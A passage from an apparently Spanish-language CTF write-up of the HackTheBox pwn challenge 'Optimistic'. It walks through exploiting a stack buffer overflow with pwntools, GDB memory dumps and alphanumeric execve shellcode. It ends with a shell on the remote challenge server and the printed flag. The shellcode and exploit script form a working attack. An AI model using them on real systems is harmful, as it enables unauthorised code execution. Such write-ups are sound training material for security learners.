<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Length of name: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'-1'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">104</span>
<span class="mtk1">    </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">stack_leak</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Name: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './optimistic'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-red">NX disabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RWX:      <span class="code-dark-red">Has RWX segments</span>
[<span class="code-green">+</span>] Starting local process './optimistic': pid 1333998
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './optimistic', '1333998', '-x', '/tmp/pwnra1og2j8.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Stack leak: 0x7ffda28224b0
[<span class="code-blue">*</span>] Switching to interactive mode
Thank you! We'll be in touch soon.
<span class="code-red">$</span>
</code></pre></div><p>Vemos que la dirección de retorno será <code>0x7ffda28224b0</code>, la fuga de memoria de la pila:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/i $rip
=&gt; <span class="code-dark-blue">0x5636b649140b</span> &lt;<span class="code-dark-yellow">main</span>+482&gt;:   ret
<span class="code-green">gef➤  </span>x/gx $rsp
<span class="code-dark-blue">0x7ffda28224b8</span>: 0x00007ffda28224b0
<span class="code-green">gef➤  </span>x/40gx 0x00007ffda28224b0
<span class="code-dark-blue">0x7ffda28224b0</span>: 0x4141414141414141      0x00007ffda28224b0  
<span class="code-dark-blue">0x7ffda28224c0</span>: 0x00007f54d463b620      0x00007ffda28225a8
<span class="code-dark-blue">0x7ffda28224d0</span>: 0x0000000100000000      0x00005636b6491229
<span class="code-dark-blue">0x7ffda28224e0</span>: 0x00005636b6491410      0xd1afc7aa11d5fbf4
<span class="code-dark-blue">0x7ffda28224f0</span>: 0x00005636b64910c0      0x00007ffda28225a0
<span class="code-dark-blue">0x7ffda2822500</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffda2822510</span>: 0x2e5482ae5855fbf4      0x2f066f2ed1bbfbf4
<span class="code-dark-blue">0x7ffda2822520</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffda2822530</span>: 0x0000000000000000      0x0000000000000001
<span class="code-dark-blue">0x7ffda2822540</span>: 0x00007ffda28225a8      0x00007ffda28225b8
<span class="code-dark-blue">0x7ffda2822550</span>: 0x00007f54d463d190      0x0000000000000000
<span class="code-dark-blue">0x7ffda2822560</span>: 0x0000000000000000      0x00005636b64910c0
<span class="code-dark-blue">0x7ffda2822570</span>: 0x00007ffda28225a0      0x0000000000000000
<span class="code-dark-blue">0x7ffda2822580</span>: 0x0000000000000000      0x00005636b64910ee
<span class="code-dark-blue">0x7ffda2822590</span>: 0x00007ffda2822598      0x000000000000001c
<span class="code-dark-blue">0x7ffda28225a0</span>: 0x0000000000000001      0x00007ffda2822a93
<span class="code-dark-blue">0x7ffda28225b0</span>: 0x0000000000000000      0x00007ffda2822ad0
<span class="code-dark-blue">0x7ffda28225c0</span>: 0x00007ffda2822adb      0x00007ffda2822af2
<span class="code-dark-blue">0x7ffda28225d0</span>: 0x00007ffda2822b0d      0x00007ffda2822b43
<span class="code-dark-blue">0x7ffda28225e0</span>: 0x00007ffda2822b54      0x00007ffda2822b7e
<span class="code-green">gef➤  </span>x/40gx 0x00007ffda28224b0-104
<span class="code-dark-blue">0x7ffda2822448</span>: 0x0000000072657771      0x4141414141414141
<span class="code-dark-blue">0x7ffda2822458</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7ffda2822468</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7ffda2822478</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7ffda2822488</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7ffda2822498</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7ffda28224a8</span>: 0x4141414141414141      0x4141414141414141
<span class="code-dark-blue">0x7ffda28224b8</span>: 0x00007ffda28224b0      0x00007f54d463b620
<span class="code-dark-blue">0x7ffda28224c8</span>: 0x00007ffda28225a8      0x0000000100000000
<span class="code-dark-blue">0x7ffda28224d8</span>: 0x00005636b6491229      0x00005636b6491410
<span class="code-dark-blue">0x7ffda28224e8</span>: 0xd1afc7aa11d5fbf4      0x00005636b64910c0
<span class="code-dark-blue">0x7ffda28224f8</span>: 0x00007ffda28225a0      0x0000000000000000
<span class="code-dark-blue">0x7ffda2822508</span>: 0x0000000000000000      0x2e5482ae5855fbf4
<span class="code-dark-blue">0x7ffda2822518</span>: 0x2f066f2ed1bbfbf4      0x0000000000000000
<span class="code-dark-blue">0x7ffda2822528</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffda2822538</span>: 0x0000000000000001      0x00007ffda28225a8
<span class="code-dark-blue">0x7ffda2822548</span>: 0x00007ffda28225b8      0x00007f54d463d190
<span class="code-dark-blue">0x7ffda2822558</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffda2822568</span>: 0x00005636b64910c0      0x00007ffda28225a0
<span class="code-dark-blue">0x7ffda2822578</span>: 0x0000000000000000      0x0000000000000000
</code></pre></div><p>Nos interesa poner la dirección donde estará nuestro <em>shellcode</em>. No obstante, este código no nos permite poner <em>shellcode</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    number </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">isalpha</span><span class="mtk1">((</span><span class="mtk7 mtki">int</span><span class="mtk1">) name[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) length]);</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((number </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (</span><span class="mtk6">9</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) name[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) length] </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">30</span><span class="mtk5">U</span><span class="mtk1">)) </span><span class="mtk5">break</span><span class="mtk1">;</span>  
<span class="mtk1">    length </span><span class="mtk5">=</span><span class="mtk1"> length </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
</code></pre></div><p>La función <code>isalpha</code> mira si un carácter es una letra. Si no, el programa comprueba si el carácter es un número. Y si no, el programa se cierra. Tenemos la posibilidad de añadir bytes arbitrarios al final del <em>payload</em>, pero solamente 8 bytes debido a este bloque <code>if</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">int</span><span class="mtk1">) read_length </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">9</span><span class="mtk1"> </span><span class="mtk5">&lt;=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) length) {</span>  
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Thank you! We</span><span class="mtk6">\'</span><span class="mtk4">ll be in touch soon."</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
</code></pre></div><p>Sin embargo, tenemos 8 bytes en <code>email</code> y otros 8 bytes en <code>age</code>, que parece suficiente espacio para poner <em>shellcode</em> personalizado. Vamos a modificar el <em>exploit</em> y mirar en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Email: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'AAAAAAAA'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Age: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'BBBBBBBB'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Length of name: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'-1'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">104</span>
<span class="mtk1">    </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">stack_leak</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Name: '</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './optimistic'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-red">NX disabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RWX:      <span class="code-dark-red">Has RWX segments</span>
[<span class="code-green">+</span>] Starting local process './optimistic': pid 1366945
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './optimistic', '1366945', '-x', '/tmp/pwnvvchkn1y.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Stack leak: 0x7ffdd3759580
[<span class="code-blue">*</span>] Switching to interactive mode
Thank you! We'll be in touch soon.
<span class="code-red">$</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>grep AAAAAAAA
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">AAAAAAAA</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffdd373a000-0x7ffdd375b000), permission=rwx
  0x7ffdd3759510 - 0x7ffdd3759547  →   "<span class="code-dark-magenta">AAAAAAAABBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]</span>"  
<span class="code-green">gef➤  </span>p/x 0x7ffdd3759580 - 0x7ffdd3759510
$1 = 0x70
</code></pre></div><p>Interesante&mldr; Vamos a analizar el <em>shellcode</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwn</span> disasm -c amd64 $(echo -ne '\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05' | xxd -p)  
   0:    48 b8 2f 62 69 6e 2f 73 68 <span class="code-dark-red">00</span>    <span class="code-dark-green">movabs</span> <span class="code-dark-red">rax</span>,  <span class="code-dark-blue">0x68732f6e69622f</span>
   a:    99                               <span class="code-dark-green">cdq</span>
   b:    50                               <span class="code-dark-green">push</span>   <span class="code-dark-red">rax</span>
   c:    54                               <span class="code-dark-green">push</span>   <span class="code-dark-red">rsp</span>
   d:    5f                               <span class="code-dark-green">pop</span>    <span class="code-dark-red">rdi</span>
   e:    52                               <span class="code-dark-green">push</span>   <span class="code-dark-red">rdx</span>
   f:    5e                               <span class="code-dark-green">pop</span>    <span class="code-dark-red">rsi</span>
  10:    6a 3b                            <span class="code-dark-green">push</span>   <span class="code-dark-blue">0x3b</span>
  12:    58                               <span class="code-dark-green">pop</span>    <span class="code-dark-red">rax</span>
  13:    0f 05                            <span class="code-dark-green">syscall</span>

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -ne <span class="code-dark-yellow">'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x5e\x6a\x3b\x58\x0f\x05'</span> | <span class="code-dark-green">xxd</span>
00000000: 48b8 2f62 696e 2f73 6800 9950 545f 525e  H./bin/sh..PT_R^
00000010: 6a3b 580f 05                             j;X..
</code></pre></div><p>Algunos bytes están permitidos para entrar en la región <code>C</code>. Los que no están permitidos tendríamos que meterlos en <code>A</code> y <code>B</code>, pero el <em>shellcode</em> tiene que ser fiable.</p><p>Vamos a poner <code>\xcc</code> (SIGTRAP, un <em>breakpoint</em>) en la región <code>A</code> para saltar a esa dirección:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Email: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\xcc</span><span class="mtk4">AAAAAAA'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Age: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'BBBBBBBB'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Length of name: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'-1'</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">104</span>
<span class="mtk1">    </span><span class="mtk1">junk</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">offset</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">junk</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">stack_leak</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">70</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './optimistic'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-red">NX disabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RWX:      <span class="code-dark-red">Has RWX segments</span>
[<span class="code-green">+</span>] Starting local process './optimistic': pid 1385841
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './optimistic', '1385841', '-x', '/tmp/pwn8149qc_h.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Stack leak: 0x7ffd5e637ec0
[<span class="code-blue">*</span>] Switching to interactive mode
Thank you! We'll be in touch soon.
<span class="code-red">$</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>info registers
rax            0x23                0x23
rbx            0x557b9b5d6410      0x557b9b5d6410
rcx            0x7fec92d26077      0x7fec92d26077
rdx            0x0                 0x0
rsi            0x7fec92e05723      0x7fec92e05723
rdi            0x7fec92e067e0      0x7fec92e067e0
rbp            0x4343434343434343  0x4343434343434343
rsp            0x7ffd5e637ed0      0x7ffd5e637ed0
r8             0x23                0x23
r9             0x6                 0x6
r10            0xfffffffffffff58a  0xfffffffffffff58a
r11            0x246               0x246
r12            0x557b9b5d60c0      0x557b9b5d60c0
r13            0x7ffd5e637fb0      0x7ffd5e637fb0
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x7ffd5e637e51      0x7ffd5e637e51
eflags         0x246               [ PF ZF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
k0             0x0                 0x0
k1             0x0                 0x0
k2             0x0                 0x0
k3             0x0                 0x0
k4             0x0                 0x0
k5             0x0                 0x0
k6             0x0                 0x0
k7             0x0                 0x0
<span class="code-green">gef➤  </span>x/20gx $rip-1
<span class="code-dark-blue">0x7ffd5e637e50</span>: 0x41414141414141cc      0x4242424242424242  
<span class="code-dark-blue">0x7ffd5e637e60</span>: 0x4343434343434343      0x4343434343434343
<span class="code-dark-blue">0x7ffd5e637e70</span>: 0x4343434343434343      0x4343434343434343
<span class="code-dark-blue">0x7ffd5e637e80</span>: 0x4343434343434343      0x4343434343434343
<span class="code-dark-blue">0x7ffd5e637e90</span>: 0x4343434343434343      0x4343434343434343
<span class="code-dark-blue">0x7ffd5e637ea0</span>: 0x4343434343434343      0x4343434343434343
<span class="code-dark-blue">0x7ffd5e637eb0</span>: 0x4343434343434343      0x4343434343434343
<span class="code-dark-blue">0x7ffd5e637ec0</span>: 0x4343434343434343      0x00007ffd5e637e50
<span class="code-dark-blue">0x7ffd5e637ed0</span>: 0x00007fec92e51620      0x00007ffd5e637fb8
<span class="code-dark-blue">0x7ffd5e637ee0</span>: 0x0000000100000000      0x0000557b9b5d6229
</code></pre></div><p>No hay espacio suficiente para poner el <em>shellcode</em> anterior (21 bytes) ya que solo tenemos 16 bytes para <em>shellcode</em> arbitrario. No obstante, podemos utilizar un codificador para introducir <em>shellcode</em> con los valores apropiados en la región <code>C</code>. Pero no hay codificadores disponibles para sistemas x86_64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">msfvenom</span> --list encoders | <span class="code-dark-green">grep</span> x64
    <span class="code-red">x64</span>/xor                       normal     XOR Encoder
    <span class="code-red">x64</span>/xor_context               normal     Hostname-based Context Keyed Payload Encoder  
    <span class="code-red">x64</span>/xor_dynamic               normal     Dynamic key XOR Encoder
    <span class="code-red">x64</span>/zutto_dekiru              manual     Zutto Dekiru
</code></pre></div><p>Aún así, se puede encontrar <a target="_blank" href="https://www.exploit-db.com/exploits/35205">este <em>shellcode</em></a>, que es completamente alfanumérico y encaja en el espacio disponible (87 bytes):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V  
</code></pre></div><p>Así que este es el <em>payload</em> final:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">shellcode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5X</span><span class="mtk4">VX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Email: '</span><span class="mtk1">, </span><span class="mtk1">shellcode</span><span class="mtk1">[:</span><span class="mtk6">8</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Age: '</span><span class="mtk1">, </span><span class="mtk1">shellcode</span><span class="mtk1">[</span><span class="mtk6">8</span><span class="mtk1">:</span><span class="mtk6">16</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Length of name: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'-1'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">104</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">shellcode</span><span class="mtk1">[</span><span class="mtk6">16</span><span class="mtk1">:]</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">stack_leak</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">70</span><span class="mtk1">)</span>
</code></pre></div><p>Y así conseguimos una <em>shell</em> en local:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './optimistic'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-red">NX disabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RWX:      <span class="code-dark-red">Has RWX segments</span>
[<span class="code-green">+</span>] Starting local process './optimistic': pid 1640072  
[<span class="code-blue">*</span>] Stack leak: 0x7ffde8b215b0
[<span class="code-blue">*</span>] Switching to interactive mode
Thank you! We'll be in touch soon.
<span class="code-red">$</span> ls
optimistic  solve.py
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Probemos en remoto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 64.227.42.184:30847
[<span class="code-blue">*</span>] './optimistic'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-red">NX disabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RWX:      <span class="code-dark-red">Has RWX segments</span>
[<span class="code-green">+</span>] Opening connection to 64.227.42.184 on port 30847: Done  
[<span class="code-blue">*</span>] Stack leak: 0x7ffc8ae208b0
[<span class="code-blue">*</span>] Switching to interactive mode
Thank you! We'll be in touch soon.
<span class="code-red">$</span> ls
flag.txt
optimistic
<span class="code-red">$</span> cat flag.txt
HTB{be1ng_negat1v3_pays_0ff!}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Optimistic/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a></li><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li><li><a href="#explotación-de-_buffer-overflow_">Explotación de <em>Buffer Overflow</em></a><ul><li><a href="#depuración-con-gdb">Depuración con GDB</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
